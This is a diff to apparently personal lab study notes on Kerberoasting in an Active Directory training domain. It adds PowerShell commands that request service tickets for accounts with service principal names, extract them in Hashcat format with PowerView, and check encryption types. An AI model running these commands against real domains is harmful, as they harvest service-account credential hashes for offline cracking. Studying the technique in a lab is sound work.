@@ -7,6 +7,8 @@ setspn.exe -Q */*
 
 Request All Tickets via setspn
 ```powershell-session
+Add-Type -AssemblyName System.IdentityModel
+
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
@@ -68,12 +70,19 @@ Extracting tickets to csv files
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 
-Check for encryption type 0 = rc4 24 = aes
+Check for encryption type 0 = rc4 24 = aes with powerview
 ```powershell-session
+
+Import-Module .\PowerView.ps1
+
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 ```
 
 Path to supported encryption types
 ```Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options```
 
-
+Get ticket with powerview
+```Import-Module .\PowerView.ps1```
+```powershell-session
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
